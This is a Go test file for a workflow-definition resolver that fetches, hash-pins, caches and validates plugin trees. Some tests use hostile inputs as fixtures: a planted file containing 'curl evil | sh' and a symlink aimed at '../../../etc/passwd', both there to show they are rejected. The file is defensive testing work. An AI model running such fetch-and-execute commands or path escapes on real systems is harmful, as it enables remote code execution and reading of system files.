package resolve

import (
	"context"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fullsend-ai/fullsend/internal/fetch"
	"github.com/fullsend-ai/fullsend/internal/gitfetch"
	"github.com/fullsend-ai/fullsend/internal/harness"
	"github.com/fullsend-ai/fullsend/internal/pluginformat"
)

const wfSHA = "0123456789abcdef0123456789abcdef01234567"

func wfTree() map[string][]byte {
	return map[string][]byte{
		".claude-plugin/plugin.json": []byte(`{"name":"wfplug"}`),
		"workflows/probe.js":         []byte("export const meta = {name: \"probe\"};\nexport default async () => {}\n"),
		"workflows/other.js":         []byte("x\n"),
		"skills/x/SKILL.md":          []byte("# x\n"),
	}
}

func wfURL(files map[string][]byte) string {
	return "https://github.com/example-org/sample-pipeline/tree/" + wfSHA + "#sha256=" + fetch.ComputeTreeHash(files)
}

func staticFetcher(files map[string][]byte, calls *int) gitfetch.TreeFetchFunc {
	return func(_ context.Context, cloneURL, path, ref, _ string) (map[string][]byte, error) {
		if calls != nil {
			*calls++
		}
		if cloneURL != "https://github.com/example-org/sample-pipeline.git" || path != "" || ref != wfSHA {
			return nil, errors.New("unexpected fetch " + cloneURL + " " + path + " " + ref)
		}
		return files, nil
	}
}

func wfHarness() *harness.Harness {
	return &harness.Harness{Agent: "a.md", Role: "test", Workflow: &harness.WorkflowSpec{Name: "probe", Args: "--issue 7"}}
}

// resolveWF resolves h with workflow.source set to source.
func resolveWF(h *harness.Harness, source string, loc WorkflowLocation, opts ResolveOpts) (*ResolvedWorkflow, *Dependency, error) {
	h.Workflow.Source = source
	return ResolveWorkflowDefinition(context.Background(), h, loc, opts)
}

// localLoc is the location of a harness in the configuration directory
// fullsendDir.
func localLoc(fullsendDir string) WorkflowLocation {
	return WorkflowLocation{HarnessDir: fullsendDir, FullsendDir: fullsendDir}
}

func wfOpts(t *testing.T, fetcher gitfetch.TreeFetchFunc) ResolveOpts {
	return ResolveOpts{
		WorkspaceRoot: t.TempDir(),
		OrgAllowlist:  []string{"https://github.com/example-org/"},
		TreeFetcher:   fetcher,
	}
}

func TestResolveWorkflowDefinition_NoWorkflow(t *testing.T) {
	rw, dep, err := ResolveWorkflowDefinition(context.Background(), &harness.Harness{}, WorkflowLocation{}, ResolveOpts{})
	require.NoError(t, err)
	assert.Nil(t, rw)
	assert.Nil(t, dep)
}

func TestResolveWorkflowDefinition_Remote(t *testing.T) {
	files := wfTree()
	calls := 0
	opts := wfOpts(t, staticFetcher(files, &calls))
	opts.AuditLogPath = filepath.Join(opts.WorkspaceRoot, "audit.jsonl")
	src := wfURL(files)

	h := wfHarness()
	rw, dep, err := resolveWF(h, src, WorkflowLocation{}, opts)
	require.NoError(t, err)
	require.NotNil(t, dep)
	assert.Equal(t, WorkflowDependencyField, dep.Field)
	assert.Equal(t, "directory", dep.Type)
	assert.False(t, dep.CacheHit)
	assert.Equal(t, fetch.ComputeTreeHash(files), dep.SHA256)
	assert.Equal(t, "workflow-definition", filepath.Base(dep.LocalPath))
	assert.Equal(t, "/wfplug:probe --issue 7", rw.Command())
	assert.Equal(t, wfSHA, rw.Commit)
	assert.False(t, rw.Local)
	assert.Equal(t, "wfplug", rw.PluginName)
	require.Len(t, h.Plugins, 1)
	assert.Equal(t, dep.LocalPath, h.Plugins[0].Path)
	assert.Equal(t, "workflow-definition", h.Plugins[0].Name())
	info, err := os.Stat(filepath.Join(rw.LocalPath, "workflows", "probe.js"))
	require.NoError(t, err)
	assert.NotZero(t, info.Mode()&0o100, "definition files are made executable")
	_, err = os.Stat(opts.AuditLogPath)
	assert.NoError(t, err, "the fetch is audited")

	// A second resolution is served from the cache by the pinned hash.
	h2 := wfHarness()
	rw2, dep2, err := resolveWF(h2, src, WorkflowLocation{}, opts)
	require.NoError(t, err)
	assert.True(t, dep2.CacheHit)
	assert.Equal(t, 1, calls)
	assert.Equal(t, rw.LocalPath, rw2.LocalPath)

	// Offline with a warm cache works; offline with a cold cache fails.
	cold := wfOpts(t, staticFetcher(files, nil))
	cold.FetchPolicy.Offline = true
	_, _, err = resolveWF(wfHarness(), src, WorkflowLocation{}, cold)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "offline mode forbids fetching it")
}

// The whole cached tree is uploaded, so a file planted in it under a
// temporary-file name must not ride along unpinned: the lookup misses, the
// definition is fetched again and the delivered tree is the pinned one.
func TestResolveWorkflowDefinition_StrayCacheFileIsNotDelivered(t *testing.T) {
	files := wfTree()
	files["scripts/helper.sh"] = []byte("echo hi\n")
	calls := 0
	opts := wfOpts(t, staticFetcher(files, &calls))
	src := wfURL(files)

	rw, _, err := resolveWF(wfHarness(), src, WorkflowLocation{}, opts)
	require.NoError(t, err)
	planted := filepath.Join(rw.LocalPath, "scripts", "helper.tmp.123")
	require.NoError(t, os.WriteFile(planted, []byte("curl evil | sh\n"), 0o600))

	rw2, dep2, err := resolveWF(wfHarness(), src, WorkflowLocation{}, opts)
	require.NoError(t, err)
	assert.False(t, dep2.CacheHit, "a cached tree with a stray file is a miss")
	assert.Equal(t, 2, calls, "the definition is fetched again")
	_, err = os.Lstat(filepath.Join(rw2.LocalPath, "scripts", "helper.tmp.123"))
	assert.True(t, os.IsNotExist(err), "the stray file is not delivered")
	var delivered []string
	require.NoError(t, filepath.WalkDir(rw2.LocalPath+string(filepath.Separator), func(p string, d fs.DirEntry, err error) error {
		require.NoError(t, err)
		if !d.IsDir() {
			rel, _ := filepath.Rel(rw2.LocalPath, p)
			delivered = append(delivered, filepath.ToSlash(rel))
		}
		return nil
	}))
	want := make([]string, 0, len(files))
	for p := range files {
		want = append(want, p)
	}
	assert.ElementsMatch(t, want, delivered, "the delivered directory is exactly the pinned tree")

	// Warm again: the replaced tree hits.
	_, dep3, err := resolveWF(wfHarness(), src, WorkflowLocation{}, opts)
	require.NoError(t, err)
	assert.True(t, dep3.CacheHit)
	assert.Equal(t, 2, calls)
}

func TestResolveWorkflowDefinition_TempNamedDefinitionFileIsRefused(t *testing.T) {
	files := wfTree()
	files["scripts/run.tmp.1"] = []byte("x")
	opts := wfOpts(t, staticFetcher(files, nil))
	src := wfURL(files)
	_, _, err := resolveWF(wfHarness(), src, WorkflowLocation{}, opts)
	require.Error(t, err)
	assert.Contains(t, err.Error(), `workflow.source: caching: scripts/run.tmp.1 is named like a cache temporary file`)
}

func TestResolveWorkflowDefinition_RemoteSubpathAndCommandWithoutArgs(t *testing.T) {
	files := wfTree()
	fetcher := func(_ context.Context, _, path, _, _ string) (map[string][]byte, error) {
		if path != "pipelines/sample" {
			return nil, errors.New("wrong path " + path)
		}
		return files, nil
	}
	url := "https://github.com/example-org/sample-pipeline/tree/" + wfSHA + "/pipelines/sample#sha256=" + fetch.ComputeTreeHash(files)
	h := wfHarness()
	h.Workflow.Args = ""
	rw, _, err := resolveWF(h, url, WorkflowLocation{}, wfOpts(t, fetcher))
	require.NoError(t, err)
	assert.Equal(t, "/wfplug:probe", rw.Command())
}

func TestResolveWorkflowDefinition_Errors(t *testing.T) {
	good := wfTree()
	withFiles := func(mut func(map[string][]byte)) map[string][]byte {
		f := wfTree()
		mut(f)
		return f
	}
	tests := []struct {
		name    string
		source  func() string
		fetcher gitfetch.TreeFetchFunc
		token   string
		harness func(h *harness.Harness)
		wantErr string
	}{
		{
			name: "hash mismatch",
			source: func() string {
				return wfURL(good)
			},
			fetcher: staticFetcher(withFiles(func(f map[string][]byte) { f["extra"] = []byte("x") }), nil),
			wantErr: `workflow.source: tree hash mismatch`,
		},
		{
			name: "symlink refused by the fetcher",
			source: func() string {
				return wfURL(good)
			},
			fetcher: func(context.Context, string, string, string, string) (map[string][]byte, error) {
				return nil, errors.Join(errors.New("gitfetch"), &gitfetch.LinkError{Path: "skills/x/run.sh", Target: "../../../etc/passwd", Problem: "leaves the fetched tree; point the link inside the repository or commit the file"})
			},
			wantErr: `workflow.source: skills/x/run.sh is a symlink to ../../../etc/passwd, which leaves the fetched tree; point the link inside the repository or commit the file`,
		},
		{
			name: "fetch failure hints at a token",
			source: func() string {
				return wfURL(good)
			},
			fetcher: func(context.Context, string, string, string, string) (map[string][]byte, error) {
				return nil, errors.New("boom")
			},
			wantErr: "boom (hint: set GH_TOKEN",
		},
		{
			name: "fetch failure with a token",
			source: func() string {
				return wfURL(good)
			},
			fetcher: func(context.Context, string, string, string, string) (map[string][]byte, error) {
				return nil, errors.New("denied")
			},
			token:   "tok",
			wantErr: "fetching https://github.com/example-org/sample-pipeline/tree/" + wfSHA + ": denied",
		},
		{
			name: "not a Claude plugin",
			source: func() string {
				f := withFiles(func(f map[string][]byte) { delete(f, ".claude-plugin/plugin.json") })
				return wfURL(f)
			},
			fetcher: staticFetcher(withFiles(func(f map[string][]byte) { delete(f, ".claude-plugin/plugin.json") }), nil),
			wantErr: `workflow.source https://github.com/example-org/sample-pipeline/tree/` + wfSHA + ` is neither a Claude Code plugin nor a pi extension`,
		},
		{
			name: "missing workflow lists the others",
			source: func() string {
				return wfURL(good)
			},
			fetcher: staticFetcher(good, nil),
			harness: func(h *harness.Harness) { h.Workflow.Name = "absent" },
			wantErr: ` has no workflows/absent.js; the definition ships: other, probe`,
		},
		{
			name: "no workflows at all",
			source: func() string {
				f := withFiles(func(f map[string][]byte) { delete(f, "workflows/probe.js"); delete(f, "workflows/other.js") })
				return wfURL(f)
			},
			fetcher: staticFetcher(withFiles(func(f map[string][]byte) { delete(f, "workflows/probe.js"); delete(f, "workflows/other.js") }), nil),
			wantErr: "no workflows/*.js scripts at all",
		},
		{
			name: "manifest without a name",
			source: func() string {
				f := withFiles(func(f map[string][]byte) { f[".claude-plugin/plugin.json"] = []byte(`{}`) })
				return wfURL(f)
			},
			fetcher: staticFetcher(withFiles(func(f map[string][]byte) { f[".claude-plugin/plugin.json"] = []byte(`{}`) }), nil),
			wantErr: `.claude-plugin/plugin.json has no usable "name" (got "")`,
		},
		{
			name: "manifest is not JSON",
			source: func() string {
				f := withFiles(func(f map[string][]byte) { f[".claude-plugin/plugin.json"] = []byte(`{`) })
				return wfURL(f)
			},
			fetcher: staticFetcher(withFiles(func(f map[string][]byte) { f[".claude-plugin/plugin.json"] = []byte(`{`) }), nil),
			wantErr: ".claude-plugin/plugin.json is not valid JSON",
		},
		{
			name: "collision with a harness plugin",
			source: func() string {
				return wfURL(good)
			},
			fetcher: staticFetcher(good, nil),
			harness: func(h *harness.Harness) {
				h.Plugins = []harness.PluginSpec{{Path: "/x/plugins/Workflow-Definition"}}
			},
			wantErr: `plugins[0] "/x/plugins/Workflow-Definition" loads as the sandbox directory "workflow-definition", which is reserved for the workflow: definition`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			h := wfHarness()
			if tt.harness != nil {
				tt.harness(h)
			}
			opts := wfOpts(t, tt.fetcher)
			opts.GitToken = tt.token
			_, _, err := resolveWF(h, tt.source(), WorkflowLocation{}, opts)
			require.Error(t, err)
			assert.Contains(t, err.Error(), tt.wantErr)
		})
	}
}

func TestResolveWorkflowDefinition_FetchErrorIsRedacted(t *testing.T) {
	secret := "ghp_" + strings.Repeat("A1b2", 9)
	fetcher := func(context.Context, string, string, string, string) (map[string][]byte, error) {
		return nil, errors.New("git fetch: exit status 128: fatal: unable to access 'https://x-access-token:" + secret + "@github.com/example-org/sample-pipeline/'")
	}
	_, _, err := resolveWF(wfHarness(), wfURL(wfTree()), WorkflowLocation{}, wfOpts(t, fetcher))
	require.Error(t, err)
	assert.NotContains(t, err.Error(), secret)
	assert.Contains(t, err.Error(), "fatal: unable to access", "the rest of git's message is kept")

	t.Run("the error chain survives redaction", func(t *testing.T) {
		cancelled := func(context.Context, string, string, string, string) (map[string][]byte, error) {
			return nil, fmt.Errorf("git fetch with token %s: %w", secret, context.Canceled)
		}
		_, _, err := resolveWF(wfHarness(), wfURL(wfTree()), WorkflowLocation{}, wfOpts(t, cancelled))
		require.Error(t, err)
		assert.NotContains(t, err.Error(), secret)
		assert.ErrorIs(t, err, context.Canceled)
	})
}

func TestResolveWorkflowDefinition_Namespace(t *testing.T) {
	resolveWith := func(t *testing.T, mut func(map[string][]byte)) (*ResolvedWorkflow, error) {
		files := wfTree()
		mut(files)
		rw, _, err := resolveWF(wfHarness(), wfURL(files), WorkflowLocation{}, wfOpts(t, staticFetcher(files, nil)))
		return rw, err
	}
	t.Run("root plugin.json is not Claude Code's manifest", func(t *testing.T) {
		rw, err := resolveWith(t, func(f map[string][]byte) {
			delete(f, ".claude-plugin/plugin.json")
			f["plugin.json"] = []byte(`{"name":"rootplug"}`)
		})
		require.NoError(t, err)
		assert.Equal(t, "workflow-definition", rw.PluginName, "without .claude-plugin/plugin.json Claude Code names the plugin after its directory")
	})
	t.Run("manifest name wins over the directory", func(t *testing.T) {
		rw, err := resolveWith(t, func(f map[string][]byte) { f["plugin.json"] = []byte(`{"name":"rootplug"}`) })
		require.NoError(t, err)
		assert.Equal(t, "wfplug", rw.PluginName)
	})
	t.Run("custom workflows path is refused", func(t *testing.T) {
		_, err := resolveWith(t, func(f map[string][]byte) {
			f[".claude-plugin/plugin.json"] = []byte(`{"name":"wfplug","workflows":"./flows/"}`)
		})
		require.Error(t, err)
		assert.Contains(t, err.Error(), `.claude-plugin/plugin.json sets "workflows", a custom workflow path, which fullsend does not support yet; keep the scripts in workflows/ at the definition root and remove the "workflows" key`)
	})
	t.Run("name that is not a string", func(t *testing.T) {
		_, err := resolveWith(t, func(f map[string][]byte) { f[".claude-plugin/plugin.json"] = []byte(`{"name":7}`) })
		require.Error(t, err)
		assert.Contains(t, err.Error(), `.claude-plugin/plugin.json "name" is not a string`)
	})
}

func TestListWorkflowScripts(t *testing.T) {
	// The workspace path carries glob characters, which a pattern match
	// would misread.
	dir := filepath.Join(t.TempDir(), "ws[1]*?", "workflows")
	require.NoError(t, os.MkdirAll(filepath.Join(dir, "probe.js"), 0o755), "a directory named like a script")
	for _, name := range []string{"real.js", "bad name.js", "notes.txt", ".js"} {
		require.NoError(t, os.WriteFile(filepath.Join(dir, name), []byte("x"), 0o644))
	}
	require.NoError(t, os.Symlink("real.js", filepath.Join(dir, "alias.js")))

	got, err := listWorkflowScripts(dir)
	require.NoError(t, err)
	assert.Equal(t, []string{"real"}, got)

	got, err = listWorkflowScripts(filepath.Join(dir, "missing"))
	require.NoError(t, err)
	assert.Empty(t, got)

	_, err = listWorkflowScripts(filepath.Join(dir, "real.js"))
	assert.Error(t, err, "a file where the directory should be")
}

func TestResolveWorkflowDefinition_ScriptDirectoryIsNotAWorkflow(t *testing.T) {
	files := wfTree()
	delete(files, "workflows/probe.js")
	files["workflows/probe.js/inner.js"] = []byte("x")
	_, _, err := resolveWF(wfHarness(), wfURL(files), WorkflowLocation{}, wfOpts(t, staticFetcher(files, nil)))
	require.Error(t, err)
	assert.Contains(t, err.Error(), `has no workflows/probe.js; the definition ships: other`)
}

func TestResolveWorkflowDefinition_CollisionWithUnresolvedURLPlugin(t *testing.T) {
	// At lock time the workflow resolves before URL plugins, so the
	// plugin's sandbox name comes from its URL path.
	files := wfTree()
	h := wfHarness()
	h.Plugins = []harness.PluginSpec{{Path: "https://github.com/example-org/plugins/tree/" + wfSHA + "/plugins/Workflow-Definition#sha256=" + fetch.ComputeTreeHash(files)}}
	_, _, err := resolveWF(h, wfURL(files), WorkflowLocation{}, wfOpts(t, staticFetcher(files, nil)))
	require.Error(t, err)
	assert.Contains(t, err.Error(), `plugins[0] "https://github.com/example-org/plugins/tree/`+wfSHA+`/plugins/Workflow-Definition#sha256=`)
	assert.Contains(t, err.Error(), `loads as the sandbox directory "workflow-definition"`)
}

func TestResolveWorkflowDefinition_NamespaceCollision(t *testing.T) {
	// The definition's namespace is "wfplug", from its manifest.
	plugin := func(t *testing.T, dirName, manifest string) string {
		dir := filepath.Join(t.TempDir(), dirName)
		require.NoError(t, os.MkdirAll(filepath.Join(dir, ".claude-plugin"), 0o755))
		if manifest != "" {
			require.NoError(t, os.WriteFile(filepath.Join(dir, ".claude-plugin", "plugin.json"), []byte(manifest), 0o644))
		} else {
			// fullsend's root marker keeps it a Claude plugin without
			// the manifest Claude Code reads its name from.
			require.NoError(t, os.WriteFile(filepath.Join(dir, "plugin.json"), []byte(`{}`), 0o644))
		}
		return dir
	}
	piExtension := func(t *testing.T, dirName string) string {
		dir := filepath.Join(t.TempDir(), dirName)
		require.NoError(t, os.MkdirAll(dir, 0o755))
		require.NoError(t, os.WriteFile(filepath.Join(dir, "index.js"), []byte("export default function () {}\n"), 0o644))
		return dir
	}
	resolveWith := func(t *testing.T, pluginPath string) error {
		files := wfTree()
		h := wfHarness()
		h.Plugins = []harness.PluginSpec{{Path: pluginPath}}
		_, _, err := resolveWF(h, wfURL(files), WorkflowLocation{}, wfOpts(t, staticFetcher(files, nil)))
		return err
	}
	collisions := []struct {
		name     string
		path     func(t *testing.T) string
		pluginNS string
	}{
		{name: "manifest name, other directory", path: func(t *testing.T) string { return plugin(t, "helpers", `{"name":"WFPlug"}`) }, pluginNS: "WFPlug"},
		{name: "directory name without a manifest", path: func(t *testing.T) string { return plugin(t, "wfplug", "") }, pluginNS: "wfplug"},
		{name: "directory name with an unreadable manifest", path: func(t *testing.T) string { return plugin(t, "wfplug", `{`) }, pluginNS: "wfplug"},
		{name: "directory name with an empty manifest name", path: func(t *testing.T) string { return plugin(t, "wfplug", `{"name":""}`) }, pluginNS: "wfplug"},
		{name: "exact name key wins over a differently cased key", path: func(t *testing.T) string {
			return plugin(t, "helpers", `{"name":"wfplug","Name":"helpers"}`)
		}, pluginNS: "wfplug"},
	}
	for _, tt := range collisions {
		t.Run(tt.name, func(t *testing.T) {
			p := tt.path(t)
			err := resolveWith(t, p)
			require.Error(t, err)
			assert.Contains(t, err.Error(), `plugins[0] "`+p+`" has the Claude Code plugin name "`+tt.pluginNS+`", the same as the workflow: definition's plugin name "wfplug"; rename one of them`)
		})
	}
	t.Run("different names", func(t *testing.T) {
		// The manifest name wins over a directory named like the
		// definition's namespace.
		require.NoError(t, resolveWith(t, plugin(t, "wfplug", `{"name":"helpers"}`)))
		require.NoError(t, resolveWith(t, plugin(t, "helpers", `{"name":"other-tools"}`)))
		// Claude Code reads only the lowercase "name" key.
		require.NoError(t, resolveWith(t, plugin(t, "helpers", `{"Name":"wfplug","name":"helpers"}`)))
	})
	t.Run("not checked until it is a Claude plugin on disk", func(t *testing.T) {
		// A pi extension is skipped by the Claude runtime, so its
		// directory name claims no command namespace.
		require.NoError(t, resolveWith(t, piExtension(t, "wfplug")))
		// A URL plugin has no manifest before resolution; its basename is
		// not its namespace, so the check waits for the resolved copy.
		require.NoError(t, resolveWith(t, "https://github.com/example-org/plugins/tree/"+wfSHA+"/plugins/wfplug#sha256="+fetch.ComputeTreeHash(wfTree())))
	})
}

// TestWorkflowCacheDoesNotServeSkillsAndPlugins checks the cache policy
// (ADR 0130): a definition is cached with its symlinks materialized in a
// namespace of its own, so a plugins: entry pinning the same tree hash
// never succeeds from that entry where a fetch with the strict fetcher
// would refuse the links, and the two never share an entry.
func TestWorkflowCacheDoesNotServeSkillsAndPlugins(t *testing.T) {
	files := wfTree()
	treeURL := "https://github.com/example-org/sample-pipeline/tree/" + wfSHA + "/pipelines/sample-pipeline"
	pinned := treeURL + "#sha256=" + fetch.ComputeTreeHash(files)
	src := pinned
	refusing := func(context.Context, string, string, string, string) (map[string][]byte, error) {
		return nil, errors.New("symlinks are not supported: skills/x/run.sh")
	}
	counting := func(calls *int) gitfetch.TreeFetchFunc {
		return func(context.Context, string, string, string, string) (map[string][]byte, error) {
			*calls++
			return files, nil
		}
	}
	resolvePlugin := func(t *testing.T, ws string, fetcher gitfetch.TreeFetchFunc) error {
		t.Helper()
		h := &harness.Harness{Agent: "/a.md", Plugins: []harness.PluginSpec{{Path: pinned}}}
		_, err := ResolveHarness(context.Background(), h, ResolveOpts{
			WorkspaceRoot: ws,
			OrgAllowlist:  []string{"https://github.com/example-org/"},
			TreeFetcher:   fetcher,
		})
		return err
	}
	resolveWorkflow := func(t *testing.T, ws string, fetcher gitfetch.TreeFetchFunc) *Dependency {
		t.Helper()
		_, dep, err := resolveWF(wfHarness(), src, WorkflowLocation{}, ResolveOpts{
			WorkspaceRoot: ws,
			OrgAllowlist:  []string{"https://github.com/example-org/"},
			TreeFetcher:   fetcher,
		})
		require.NoError(t, err)
		return dep
	}

	t.Run("cold plugin refuses the links", func(t *testing.T) {
		err := resolvePlugin(t, t.TempDir(), refusing)
		require.Error(t, err)
		assert.Contains(t, err.Error(), "symlinks are not supported")
	})
	t.Run("plugin after a warm workflow still refuses the links", func(t *testing.T) {
		ws := t.TempDir()
		calls := 0
		resolveWorkflow(t, ws, counting(&calls))
		err := resolvePlugin(t, ws, refusing)
		require.Error(t, err, "the materialized entry is a miss for plugins")
		assert.Contains(t, err.Error(), "symlinks are not supported")
		// The workflow keeps its cache entry.
		dep := resolveWorkflow(t, ws, refusing)
		assert.True(t, dep.CacheHit)
		assert.Equal(t, 1, calls)
	})
	t.Run("plugin after a warm workflow refetches strictly", func(t *testing.T) {
		ws := t.TempDir()
		workflowCalls, pluginCalls := 0, 0
		resolveWorkflow(t, ws, counting(&workflowCalls))
		require.NoError(t, resolvePlugin(t, ws, counting(&pluginCalls)))
		assert.Equal(t, 1, pluginCalls, "the plugin was fetched, not served from the materialized entry")
		// Both now hit the cache.
		require.NoError(t, resolvePlugin(t, ws, refusing))
		assert.True(t, resolveWorkflow(t, ws, refusing).CacheHit)
	})
	t.Run("workflow after a warm plugin fetches its own tree", func(t *testing.T) {
		ws := t.TempDir()
		pluginCalls, workflowCalls := 0, 0
		require.NoError(t, resolvePlugin(t, ws, counting(&pluginCalls)))
		dep := resolveWorkflow(t, ws, counting(&workflowCalls))
		assert.False(t, dep.CacheHit, "the plugin's entry is not in the definition namespace")
		assert.Equal(t, 1, workflowCalls)
		assert.True(t, resolveWorkflow(t, ws, refusing).CacheHit)
		require.NoError(t, resolvePlugin(t, ws, refusing), "the plugin keeps its own entry")
	})
}

// localRepo builds a git checkout <repo> holding .fullsend/ plus a
// definition at <repo>/<sub> whose skill script is a symlink to a shared
// scripts/ directory, and stages everything (the index is what a local
// source reads).
func localRepo(t *testing.T, sub string) (repo, fullsendDir string) {
	t.Helper()
	repo = t.TempDir()
	fullsendDir = filepath.Join(repo, ".fullsend")
	def := filepath.Join(repo, filepath.FromSlash(sub))
	for p, c := range map[string]string{
		".claude-plugin/plugin.json": `{"name":"wfplug"}`,
		"workflows/probe.js":         "export const meta = { name: 'probe' };\n",
		"scripts/run.sh":             "#!/bin/sh\n",
	} {
		full := filepath.Join(def, filepath.FromSlash(p))
		require.NoError(t, os.MkdirAll(filepath.Dir(full), 0o755))
		require.NoError(t, os.WriteFile(full, []byte(c), 0o644))
	}
	require.NoError(t, os.MkdirAll(filepath.Join(def, "skills", "x"), 0o755))
	require.NoError(t, os.Symlink("../../scripts/run.sh", filepath.Join(def, "skills", "x", "run.sh")))
	require.NoError(t, os.MkdirAll(filepath.Join(fullsendDir, ".fullsend-cache"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(fullsendDir, "config.yaml"), []byte("version: \"1\"\n"), 0o644))
	gitIn(t, repo, "init", "-q", "-b", "main")
	gitIn(t, repo, "add", "-A")
	return repo, fullsendDir
}

func gitIn(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git %s: %v\n%s", strings.Join(args, " "), err, out)
	}
}

func TestResolveWorkflowDefinition_Local(t *testing.T) {
	for _, sub := range []string{".", "pipelines/sample"} {
		t.Run(sub, func(t *testing.T) {
			repo, fullsendDir := localRepo(t, sub)
			require.NoError(t, os.WriteFile(filepath.Join(repo, filepath.FromSlash(sub), "untracked.txt"), []byte("u"), 0o644))
			h := wfHarness()
			rw, dep, err := resolveWF(h, sub, localLoc(fullsendDir),
				ResolveOpts{WorkspaceRoot: fullsendDir})
			require.NoError(t, err)
			assert.Nil(t, dep, "local definitions are not locked")
			assert.True(t, rw.Local)
			assert.Equal(t, sub, rw.Source)
			assert.Equal(t, "workflow-definition", filepath.Base(rw.LocalPath))
			info, err := os.Lstat(filepath.Join(rw.LocalPath, "skills", "x", "run.sh"))
			require.NoError(t, err)
			assert.True(t, info.Mode().IsRegular(), "the uploaded tree holds the link's target, not the link")
			_, err = os.Stat(filepath.Join(rw.LocalPath, ".fullsend"))
			assert.True(t, os.IsNotExist(err), ".fullsend/ is never part of a local tree")
			_, err = os.Stat(filepath.Join(rw.LocalPath, "untracked.txt"))
			assert.True(t, os.IsNotExist(err), "untracked files are not delivered")
			require.Len(t, h.Plugins, 1)

			// The cached tree is a materialized entry: a strict lookup
			// misses it.
			strict, _, err := fetch.CacheGetDir(fullsendDir, rw.TreeHash)
			require.NoError(t, err)
			assert.Empty(t, strict)

			// Resolving again hits the cache and yields the same tree.
			rw2, _, err := resolveWF(wfHarness(), sub, localLoc(fullsendDir),
				ResolveOpts{WorkspaceRoot: fullsendDir})
			require.NoError(t, err)
			assert.Equal(t, rw.TreeHash, rw2.TreeHash)
		})
	}
}

func TestResolveWorkflowDefinition_LocalErrors(t *testing.T) {
	resolveLocal := func(source, fullsendDir string) error {
		_, _, err := resolveWF(wfHarness(), source, localLoc(fullsendDir), ResolveOpts{WorkspaceRoot: fullsendDir})
		return err
	}
	t.Run("missing", func(t *testing.T) {
		_, fullsendDir := localRepo(t, "def")
		err := resolveLocal("nope", fullsendDir)
		require.Error(t, err)
		assert.Contains(t, err.Error(), `workflow.source "nope": "nope" does not exist in`)
	})
	t.Run("source is a symlink leaving the repository", func(t *testing.T) {
		repo, fullsendDir := localRepo(t, "def")
		outside := t.TempDir()
		require.NoError(t, os.WriteFile(filepath.Join(outside, "f"), []byte("x"), 0o644))
		require.NoError(t, os.Symlink(outside, filepath.Join(repo, "escape")))
		err := resolveLocal("escape", fullsendDir)
		require.Error(t, err)
		assert.Contains(t, err.Error(), `workflow.source "escape": "escape" is a symlink in the repository; point source at the real directory`)
	})
	t.Run("link inside the definition leaves it", func(t *testing.T) {
		repo, fullsendDir := localRepo(t, "def")
		require.NoError(t, os.WriteFile(filepath.Join(repo, "shared.sh"), []byte("x"), 0o644))
		require.NoError(t, os.Symlink("../shared.sh", filepath.Join(repo, "def", "shared.sh")))
		gitIn(t, repo, "add", "-A")
		err := resolveLocal("def", fullsendDir)
		require.Error(t, err)
		assert.Contains(t, err.Error(), `workflow.source "def": shared.sh is a symlink to ../shared.sh, which leaves the source directory`)
	})
	t.Run("not a git checkout", func(t *testing.T) {
		repo := t.TempDir()
		fullsendDir := filepath.Join(repo, ".fullsend")
		require.NoError(t, os.MkdirAll(fullsendDir, 0o755))
		t.Setenv("GIT_CEILING_DIRECTORIES", filepath.Dir(repo))
		err := resolveLocal(".", fullsendDir)
		require.Error(t, err)
		assert.Contains(t, err.Error(), `workflow.source: a path source needs the harness to be in a git checkout`)
		assert.Contains(t, err.Error(), fmt.Sprintf("%q is not inside one", fullsendDir))
		assert.NotNil(t, errors.Unwrap(err), "the git error is wrapped")
	})
	t.Run("fullsend directory is the checkout root", func(t *testing.T) {
		// A configuration repository holds config.yaml at its top; "."
		// is then fullsend's configuration directory, so it is refused
		// and a sub-directory works.
		repo, _ := localRepo(t, "def")
		err := resolveLocal(".", repo)
		require.Error(t, err)
		assert.Contains(t, err.Error(), `workflow.source "." is the top of a checkout that is fullsend's configuration directory, which is never part of a definition; put the definition in a sub-directory`)
		require.NoError(t, resolveLocal("def", repo))
	})
	t.Run("source is the fullsend directory", func(t *testing.T) {
		_, fullsendDir := localRepo(t, "def")
		err := resolveLocal(".fullsend", fullsendDir)
		require.Error(t, err)
		assert.Contains(t, err.Error(), `workflow.source ".fullsend" is fullsend's configuration directory, which is never part of a definition`)
	})
	t.Run("source inside the fullsend directory", func(t *testing.T) {
		repo, fullsendDir := localRepo(t, "def")
		pipeline := filepath.Join(repo, ".fullsend", "workflows", "pipeline")
		require.NoError(t, os.MkdirAll(filepath.Join(pipeline, ".claude-plugin"), 0o755))
		require.NoError(t, os.WriteFile(filepath.Join(pipeline, ".claude-plugin", "plugin.json"), []byte(`{"name":"wfplug"}`), 0o644))
		gitIn(t, repo, "add", "-A")
		err := resolveLocal(".fullsend/workflows/pipeline", fullsendDir)
		require.Error(t, err)
		assert.Contains(t, err.Error(), `workflow.source ".fullsend/workflows/pipeline" is inside fullsend's configuration directory .fullsend/, which is never part of a definition; put the definition in another directory and set source to its path`)
	})
	t.Run("configuration repository sub-directory", func(t *testing.T) {
		// With the configuration directory at the checkout top, a
		// sub-directory source is accepted and delivered whole.
		repo, _ := localRepo(t, "defs")
		require.NoError(t, os.WriteFile(filepath.Join(repo, "config.yaml"), []byte("version: \"1\"\n"), 0o644))
		gitIn(t, repo, "add", "-A")
		rw, _, err := resolveWF(wfHarness(), "defs", localLoc(repo), ResolveOpts{WorkspaceRoot: repo})
		require.NoError(t, err)
		_, err = os.Stat(filepath.Join(rw.LocalPath, "workflows", "probe.js"))
		require.NoError(t, err)
		_, err = os.Stat(filepath.Join(rw.LocalPath, ".claude-plugin", "plugin.json"))
		require.NoError(t, err)
		_, err = os.Stat(filepath.Join(rw.LocalPath, "config.yaml"))
		assert.True(t, os.IsNotExist(err), "the configuration files at the top are outside defs")
	})
	t.Run("no repository root", func(t *testing.T) {
		_, _, err := resolveWF(wfHarness(), ".", WorkflowLocation{}, ResolveOpts{WorkspaceRoot: t.TempDir()})
		require.Error(t, err)
		assert.True(t, strings.Contains(err.Error(), "needs the repository that holds the harness"))
	})
}

